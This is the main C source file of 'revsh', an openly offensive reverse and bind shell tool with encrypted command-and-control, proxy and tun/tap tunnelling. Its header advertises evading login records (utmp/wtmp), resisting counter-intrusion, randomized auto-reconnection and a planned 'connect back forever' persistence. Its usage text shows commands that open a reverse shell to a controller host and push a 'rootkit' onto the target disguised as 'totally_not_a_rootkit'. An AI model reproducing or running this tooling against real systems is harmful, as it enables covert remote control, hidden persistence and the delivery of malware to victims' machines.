
/***********************************************************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support!
 *	Now with more Perfect Forward Secrecy!!!
 *
 *
 * 2013-07-17: Original release.
 * 2014-08-22: Complete overhaul w/SSL support.
 * 2015-01-16: YACO (Yet another complete overhaul.) Added the internal messaging interface.
 * 2016-08-27: YACO (Yet another complete overhaul.) Added proxies and tun/tap support.
 *
 *
 * The revsh binary is intended to be used both on the local control host as well as the remote target host. It is
 * designed to establish a remote shell with terminal support as well as full reverse vpn style tunneling..
 * revsh isn't intended as a replacement for netcat, but rather as a supplementary tool. 
 *
 *
 * Features:
 *		* Reverse Shell.
 *		* Bind Shell.
 *		* Terminal support.
 *		* UTF-8 support.
 *		* Handle window resize events.
 *		* Circumvent utmp / wtmp. (No login recorded.)
 *		* Process rc file commands upon login.
 *		* OpenSSL encryption with key based authentication baked into the binary.
 *		* Anonymous Diffie-Hellman encryption as default
 *		* Ephemeral Diffie-Hellman encryption on request.
 *		* Cert pinning for protection against sinkholes and mitm counter-intrusion.
 *		* Connection timeout for remote process self-termination.
 *		* Randomized retry timers for non-predictable auto-reconnection.
 *		* Non-interactive mode for transfering files.
 *		* Proxy support: point-to-point, socks4, socks4a, socks5
 *			(Note: Only the "TCP Connect" subset of the socks protocol is supported.)
 *		* TUN / TAP support
 *
 **********************************************************************************************************************/



#include "common.h"



char *GLOBAL_calling_card = CALLING_CARD;

volatile sig_atomic_t sig_found = 0;


/***********************************************************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 **********************************************************************************************************************/

// XXX
// Fix -k keepalive for persistance after disconnect. Make target node try to connect back forever.
// Remove -a switch. 
// -e : ephemeral dh.
//		Add check for #ifdef GENERIC_BUILD that sets default to ADH and prints a friendly error message if c2 invoked w/-e.
// -v : handle multpiles for counter of verbosity.
// -H : long usage (the old one). 
// -h : simple usage (a new one).
// -l : same thing as -c
// -w : Disable default proxy.  (Just set config->socks to NULL.)
// -x : Disable default tun.
// -y : Disable default tap.

// XXX
// Make static binary default.
// Make a man page.
// Test on freebsd.


void usage(int ret_code){
	FILE *out_stream = stdout;

	if(ret_code){
		out_stream = stderr;
	}

#ifdef OPENSSL
	fprintf(out_stream, "\nusage:\t%s\t[-c [-a] [-d KEYS_DIR] [-f RC_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]\n\t\t[-s SHELL] [-t SEC] [-r SEC1[,SEC2]] [-z LOG_FILE] [-b] [-n] [-k] [-v] [-h] [ADDRESS:PORT]\n", program_invocation_short_name);
#else /* OPENSSL */
	fprintf(out_stream, "\nusage:\t%s\t[-c [-f RC_FILE]] [-s SHELL] [-t SEC] [-r SEC1[,SEC2] [-z LOG_FILE] [-L [LHOST:]LPORT:RHOST:RPORT] [-D [LHOST:]LPORT]]\n\t\t[-b [-k]] [-n] [-v] [ADDRESS:PORT]\n", program_invocation_short_name);
#endif /* OPENSSL */

	fprintf(out_stream, "\n\t-c\t\tRun in command and control mode.\t\t(Default is target mode.)\n");
#ifdef OPENSSL
	fprintf(out_stream, "\t-a\t\tEnable Anonymous Diffie-Hellman mode.\t\t(Default is \"%s\".)\n", CONTROLLER_CIPHER);
	fprintf(out_stream, "\t-d KEYS_DIR\tReference the keys in an alternate directory.\t(Default is \"%s\".)\n", KEYS_DIR);
#endif /* OPENSSL */
	fprintf(out_stream, "\t-f RC_FILE\tReference an alternate rc file.\t\t\t(Default is \"%s\".)\n", RC_FILE);
	fprintf(out_stream, "\t-L\t\tLocal Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
	fprintf(out_stream, "\t-D\t\tDynamic Forward:\n\t\t\tOpen a listening port locally on LHOST:LPORT.\n\t\t\tForward traffic to RHOST:RPORT.\n"); 
	fprintf(out_stream, "\t-s SHELL\tInvoke SHELL as the remote shell.\t\t(Default is \"%s\".)\n", DEFAULT_SHELL);
	fprintf(out_stream, "\t-t SEC\t\tSet the connection timeout to SEC seconds.\t(Default is \"%d\".)\n", TIMEOUT);
	fprintf(out_stream, "\t-r SEC1,SEC2\tSet the retry time to be SEC1 seconds, or\t(Default is \"%s\".)\n\t\t\tto be random in the range from SEC1 to SEC2.\n", RETRY);
#ifdef LOG_FILE
	fprintf(out_stream, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(Default is \"%s\".)\n", LOG_FILE);
#else
	fprintf(out_stream, "\t-z LOG_FILE\tLog general use and errors to LOG_FILE.\t(No default set.)\n");
#endif
	fprintf(out_stream, "\t-b\t\tStart in bind shell mode.\t\t\t(Default is reverse shell mode.)\n");
	fprintf(out_stream, "\t-k\t\tRun in keep-alive mode.\n\t\t\tOnly valid in bind shell mode.\n");
	fprintf(out_stream, "\t-n\t\tNon-interactive netcat style data broker.\t(Default is interactive w/remote tty.)\n\t\t\tNo tty. Useful for copying files.\n");
	fprintf(out_stream, "\t-v\t\tVerbose output.\n");
	fprintf(out_stream, "\t-h\t\tPrint this help.\n");
	fprintf(out_stream, "\tADDRESS:PORT\tThe address and port of the listening socket.\t(Default is \"%s\".)\n", ADDRESS);
	fprintf(out_stream, "\n\tNotes:\n");
	fprintf(out_stream, "\t\t* The -b flag must be invoked on both the control and target hosts to enable bind shell mode.\n");
	fprintf(out_stream, "\t\t* Bind shell mode can also be enabled by invoking the binary as 'bindsh' instead of 'revsh'.\n");
	fprintf(out_stream, "\t\t* Verbose output may mix with data if -v is used together with -n.\n");
	fprintf(out_stream, "\n\tInteractive example:\n");
	fprintf(out_stream, "\t\tlocal controller host:\trevsh -c 192.168.0.42:443\n");
	fprintf(out_stream, "\t\tremote target host:\trevsh 192.168.0.42:443\n");
	fprintf(out_stream, "\n\tNon-interactive example:\n");
	fprintf(out_stream, "\t\tlocal controller host:\tcat ~/bin/rootkit | revsh -n -c 192.168.0.42:443\n");
	fprintf(out_stream, "\t\tremote target host:\trevsh 192.168.0.42:443 > ./totally_not_a_rootkit\n");
	fprintf(out_stream, "\n\n");

	exit(ret_code);
}



/***********************************************************************************************************************
 *
 * main()
 *
 * Inputs: The usual argument count followed by the argument vector.
 * Outputs: 0 on success. -1 on error.
 *
 * Purpose: main() parses the configuration and calls the appropriate conductor function.
 *
 **********************************************************************************************************************/
int main(int argc, char **argv){

	int retval;
	int opt;
	char *tmp_ptr;

	struct proxy_request_node *tmp_proxy_ptr = NULL;
	struct proxy_request_node *cur_proxy_ptr = NULL;

	struct config_helper *config;

	char *retry_string = RETRY;

	unsigned int seed;
	int tmp_fd;

  wordexp_t log_file_exp;


	/*
	 * Basic initialization.
	 */

	/* We will not print errors here, as verbose status has not yet been set. */
	if((io = (struct io_helper *) calloc(1, sizeof(struct io_helper))) == NULL){
		report_error("main(): calloc(1, %d): %s", (int) sizeof(struct io_helper), strerror(errno));
		return(-1);
	}

	if((config = (struct config_helper *) calloc(1, sizeof(struct config_helper))) == NULL){
		report_error("main(): calloc(1, %d): %s", (int) sizeof(struct config_helper), strerror(errno));
		return(-1);
	}

	/* message is used throughout the code as a shorthand for io->message. */
	message = &io->message;

	/* Set defaults. */
	io->local_in_fd = fileno(stdin);
	io->local_out_fd = fileno(stdout);
	io->controller = 0;
	io->eof = 0;
	io->child_sid = 0;
	io->proxy_head = NULL;
	io->proxy_tail = NULL;

	config->interactive = 1;
	config->shell = NULL;
	config->rc_file = RC_FILE;
	config->keys_dir = KEYS_DIR;
	config->bindshell = 0;
	config->timeout = TIMEOUT;
	config->keepalive = 0;
	config->nop = 0;

	// XXX Add opts for these when redoing the opts.
	config->tun = 1;
	config->tap = 1;
	config->socks = SOCKS_LISTENER;

#ifdef NOP
	config->nop = 1;
#endif

	config->log_file = NULL;
#ifdef LOG_FILE
	config->log_file = LOG_FILE;
#endif

	verbose = 0;

#ifdef OPENSSL
	io->fingerprint_type = NULL;

	//config->encryption = EDH;
	config->encryption = ADH;
	config->cipher_list = NULL;
#endif /* OPENSSL */


	/*  Normally I would use the Gnu version. However, this tool needs to be more portable. */
	/*  Keeping the naming scheme, but setting it up myself. */
	if((program_invocation_short_name = strrchr(argv[0], '/'))){
		program_invocation_short_name++;
	}else{
		program_invocation_short_name = argv[0];
	}

	/* Grab the configuration from the command line. */
	while((opt = getopt(argc, argv, "hHpbkacs:d:f:L:R:D:r:z:t:nv")) != -1){
		switch(opt){

			case 'h':
				usage(0);
				break;

			/*  The plaintext case is an undocumented "feature" which should be difficult to use. */
			/*  You will need to pass the -p switch from both ends in order for it to work. */
			/*  This is provided for debugging purposes only. */
#ifdef OPENSSL
			case 'p':
				config->encryption = PLAINTEXT;
				break;

			case 'a':
				config->encryption = ADH;
				break;

			case 'd':
				config->keys_dir = optarg;
				break;
#endif /* OPENSSL */

				/*  bindshell */
			case 'b':
				config->bindshell = 1;
				break;

			case 'k':
				config->keepalive = 1;
				break;

			case 'c':
				io->controller = 1;
				break;

			case 's':
				config->shell = optarg;
				break;

			case 'f':
				config->rc_file = optarg;
				break;

			case 'L':
			case 'D':
				if((tmp_proxy_ptr = (struct proxy_request_node *) calloc(1, sizeof(struct proxy_request_node))) == NULL){
					report_error("main(): calloc(1, %d): %s", (int) sizeof(struct proxy_node), strerror(errno));
					return(-1);
				}

				if(!cur_proxy_ptr){
					cur_proxy_ptr = tmp_proxy_ptr;
					config->proxy_request_head = cur_proxy_ptr;
				}else{
					cur_proxy_ptr->next = tmp_proxy_ptr;
					cur_proxy_ptr = tmp_proxy_ptr;
				}
				cur_proxy_ptr->request_string = optarg;

				cur_proxy_ptr->type = PROXY_STATIC;
				if(opt == 'D'){
					cur_proxy_ptr->type = PROXY_DYNAMIC;
				}
				break;
			
			case 'r':
				retry_string = optarg;
				break;

			case 'z':
				config->log_file = optarg;
				break;

			case 't':
				errno = 0;
				config->timeout = strtol(optarg, NULL, 10);
				break;

			case 'n':
				config->interactive = 0;
				break;

			case 'v':
				verbose = 1;
				break;

			default:
				usage(-1);
		}
	}

	/* Check for bindshell mode from name. */
	tmp_ptr = strrchr(argv[0], '/');	
	if(!tmp_ptr){
		tmp_ptr = argv[0];
	}else{
		tmp_ptr++;
	}

	if(!strncmp(tmp_ptr, "bindsh", 6)){
		config->bindshell = 1;
	}

	/* Grab the ip address. */
	if((argc - optind) == 1){
		config->ip_addr = argv[optind];
	}else if((argc - optind) == 0){
		config->ip_addr = ADDRESS;
	}else{
		usage(-1);
	}

	if(io->controller){
		/* Before anything else, let's try and get the log file opened. */
		if(wordexp(config->log_file, &log_file_exp, 0)){
			report_error("main(): wordexp(%s, %lx, 0): %s", config->log_file, (unsigned long)  &log_file_exp, strerror(errno));
			return(-1);
		}

		if(log_file_exp.we_wordc != 1){
			report_error("main(): Invalid path: %s", config->log_file);
			return(-1);
		}

		if(config->log_file){
			if((io->log_stream = fopen(log_file_exp.we_wordv[0], "a")) == NULL){
				report_error("main(): fopen(\"%s\", \"a\"): %s", log_file_exp.we_wordv[0], strerror(errno));
				return(-1);
			}
		}
	}

	/* Grab some entropy and seed rand(). */
	if((tmp_fd = open("/dev/random", O_RDONLY)) == -1){
		report_error("main(): open(\"/dev/random\", O_RDONLY): %s", strerror(errno));
		return(-1);
	}

	if((retval = read(tmp_fd, &seed, sizeof(seed))) != sizeof(seed)){
		report_error("main(): read(%d, %lx, %d): Unable to fill seed!", tmp_fd, (unsigned long) &seed, (int) sizeof(seed));
		return(-1);
	}

	close(tmp_fd);

	srand(seed);


	/*  The joy of a struct with pointers to functions. We only call "io->remote_read()" and the */
	/*  appropriate crypto / no crypto version is called on the backend. */
	io->remote_read = &remote_read_plaintext;
	io->remote_write = &remote_write_plaintext;

#ifdef OPENSSL
	if(config->encryption){
		io->remote_read = &remote_read_encrypted;
		io->remote_write = &remote_write_encrypted;
		io->fingerprint_type = EVP_sha1();

		switch(config->encryption){

			case ADH:
				config->cipher_list = ADH_CIPHER;
				break;

			case EDH:
				config->cipher_list = CONTROLLER_CIPHER;
				break;
		}
	}

	SSL_library_init();
	SSL_load_error_strings();
#endif /* OPENSSL */

	pagesize = sysconf(_SC_PAGESIZE);

	/*  Prepare the retry timer values. */
	errno = 0;
	config->retry_start = strtol(retry_string, &tmp_ptr, 10);
	if(errno){
		report_error("main(): strtol(%s, %lx, 10): %s", retry_string, (unsigned long) &tmp_ptr, strerror(errno));
		return(-1);
	}

	if(*tmp_ptr != '\0'){
		tmp_ptr++;
	}

	errno = 0;
	config->retry_stop = strtol(tmp_ptr, NULL, 10);
	if(errno){
		report_error("main(): strtol(%s, NULL, 10): %s", tmp_ptr, strerror(errno));
		return(-1);
	}

	/* Call the appropriate conductor. */
	if(io->controller){
		do{
			retval = do_control(config);
		} while(retval != -1 && config->keepalive);
	}else{
		retval = do_target(config);
	}

	return(retval);
}



/* 
	 The man page for POSIX_OPENPT(3) states that for code that runs on older systems, you can define this yourself
	 easily.
 */
#ifndef FREEBSD
int posix_openpt(int flags){
	return open("/dev/ptmx", flags);
}
#endif /* FREEBSD */
